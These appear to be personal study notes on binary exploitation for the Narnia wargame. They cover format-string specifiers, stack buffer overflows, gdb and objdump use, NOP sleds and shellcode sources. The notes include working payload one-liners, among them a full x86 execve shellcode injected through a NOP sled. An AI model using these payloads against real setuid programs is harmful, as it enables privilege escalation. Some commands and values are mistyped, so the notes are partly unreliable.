# Reverse engineering(pwn) : 
## basic
		--> Analyzing the source code
		--> ltrace : will run file in binary until it exits
		--> value not address : 0x41414141--> AAAA | 0x42424242 --> BBBB|  0x90c90c90c --> \x90
		--> GOT (Global offset table) 
		--> PLT (procedure Linkage Table) 
##  Format string bug : 
		--> %x : reads and print the value from the current buffer pointer
		--> %n : --> reads the value stored in the current buffer pointer 
			 --> write to that memory location the number of characters already printed
		--> %s: To specify strings
		--> %d: To specify integers
		--> %f: To specify floats
		--> %u: To specify unsigned integers
		--> %p: To specify pointers
		--> %x: To print the hex value
		
##  buffer overflow
		--> Low Memory Addresses (0x0000) --> HIgh Memory Addressees(0xFFFF)
		--> to change higer memory
			--> as function --24byte | long(8 byte) -- char(20 byte) 
				--> full in char first then can go to long 
				
		--> echo -e(escape) "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" have to reverse (0xdeadbeddf)
		--> (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat;) |./narnia0
			--> create a command group ( command 1 ; command 2; )
			--> add cat to keeps the command shell open //system(“/bin/sh”)
		--> test :r $(python3 -d 'print("A")*300')
		--> check shell-code bytes in size : 
			--> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 (300 number of byte)
			--> r $(python3 -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")')
			--> /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41386941
		
		 --> NOP sled :	
			--> use NOP sled(\x90) replace shell-code bytes + EIP bytes
			--> NOP sled is used to direct the CPU’s instruction execution flow to a desired destination
			--> as r $(python3 -c 'print("A"*132+"B"*4)') :  
				--> 132 - shell code byte (33) --> 99 // eip : Ox42424242 (BBBB)
			
		--> bug : 0x90c290c2 -- python3 UTF error --> shuold be 0x90909090
			--> 'import sys; sys.stdout.buffer.write(b"A")'
			--> r $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*99 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" +b"\x70\xd7\xff\xff")')
			
			
##  Environment variable (Env-Variable)  :
		--> expecting the environment variable (global) EGG to contain data
			--> export EGG=cd
			--> echo $EGG
			---> export EGG=`perl -e 'print "\x31...\x80"'`
		
## Shellcode: 
		--> resource : 
			--> http://shell-storm.org/shellcode/index.html
				--> uname -a  --> for OS so any x86 or x86_64 
			
			--> https://github.com/7feilee/shellcode/tree/master/Linux/x86 
				-->https://github.com/7feilee/shellcode/blob/master/Linux/x86/execve(-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL).c
		***work		--> \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
				--> export EGG=$(echo -e "\x6a..\x80")
				
		--> couter shellcode byte :
				--> delecte indent : sed -i 's/^[[:space:]]*//g' shellcode
				--> ./shellcode_byte_counter.sh SHELLCODE_FILE

				
## Segmentation fault :
		--> gbd  :  debug the binary 
			--> gdb ./narnia1

			--> disassemble main // disassemble vuln(function name)
				--> print out the memory addresses and assembly code
				--> for everything happening in the main() function 
			--> run // run program
			--> set breakpoint : break  *0x080491e1 
				--> 25 values that set for the eax registe :  x/25x $eax  
					--> convert value from hex to ascii
				--> c : Continuie
			--> info registers : show registers --> eip 

			--> Stack Pointer (ESP)  : x/300wx $esp
				--> filled with \x90 --> find a address which 0x90909090
			--> p system : -->find a address than use system() function 
		
			
			--> esp vs eap vs eip
			
## objdump
			--> USEAGE : 
				--> listing headers for an executable
				--> disassembling an executable  
				--> display debug information.
			--> objdump -d -M intel /narnia/narnia3
				 -d  (disassemble the binary) -M (set our disassembly flavor to  intel )
			--> <main> function :
				--> DWORD PTR [ebp-0x18],0x7665642f
		











